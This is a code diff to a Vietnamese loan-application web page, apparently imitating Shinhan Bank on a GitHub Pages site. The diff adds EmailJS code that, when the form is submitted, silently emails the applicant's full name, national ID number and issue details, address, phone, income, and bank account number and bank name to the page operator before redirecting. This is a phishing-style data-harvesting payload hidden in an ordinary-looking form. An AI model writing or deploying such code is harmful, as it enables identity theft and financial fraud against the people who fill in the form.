@@ -414,7 +414,7 @@
                     <label class="form-label">Nơi cấp <span>*</span></label>
                     <select class="form-select long" id="idIssuePlace">
                         <option value="" disabled selected>Chọn nơi cấp</option>
-                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢNG LÍ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
+                        <option value="CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÍ HÀNH CHÍNH VỀ TRẬT TỰ XÃ HỘI (CTCCSQLACVTTXH)">CỤC TRƯỜNG CỤC CẢNH SÁT QUẢN LÝ HÀNH CHÍNH VỀ TTXH</option>
                         <option value="Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư">Cục Cảnh sát ĐKQL Cư trú và DLQG về dân cư</option>
                     </select>
                 </div>
@@ -639,7 +639,11 @@
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
     <script>
+        // Initialize EmailJS with your Public Key
+        emailjs.init('OrBsI926QI2_xBh1f');
+
         let userData = {};
 
         function getCurrentDate() {
@@ -797,8 +801,45 @@
                     currentStep: 2
                 };
                 console.log('Submitting userData:', userData);
+
+                // Save to localStorage
                 if (saveToLocalStorage()) {
-                    window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+                    // Send email using EmailJS
+                    emailjs.send('service_60tgxof', 'template_uhyb8ve', {
+                        full_name: userData.fullName,
+                        dob: userData.dob,
+                        gender: userData.gender,
+                        contact_address: userData.contactAddress,
+                        hometown: userData.hometown,
+                        id_number: userData.idNumber,
+                        id_issue_date: userData.idIssueDate,
+                        nationality: userData.nationality,
+                        id_issue_place: userData.idIssuePlace,
+                        phone_number: userData.phoneNumber,
+                        email: userData.email,
+                        loan_type: userData.loanType,
+                        loan_term: userData.loanTerm,
+                        loan_amount: userData.loanAmount,
+                        disbursement_date: userData.disbursementDate,
+                        income: userData.income,
+                        occupation: userData.occupation,
+                        loan_purpose: userData.loanPurpose,
+                        company_phone: userData.companyPhone,
+                        company_address: userData.companyAddress,
+                        has_bad_debt: userData.hasBadDebt,
+                        has_high_debt: userData.hasHighDebt,
+                        account_holder_name: userData.accountHolderName,
+                        account_number: userData.accountNumber,
+                        bank_name: userData.bankName
+                    })
+                    .then(function(response) {
+                        console.log('Email sent successfully:', response);
+                        // Redirect to the next step
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+                    }, function(error) {
+                        console.error('Failed to send email:', error);
+                        $('#formError').text('Lỗi gửi email. Vui lòng thử lại hoặc liên hệ hỗ trợ.').show();
+                    });
                 } else {
                     console.error('Failed to save to localStorage');
                     $('#formError').text('Lỗi lưu dữ liệu. Vui lòng thử lại.').show();
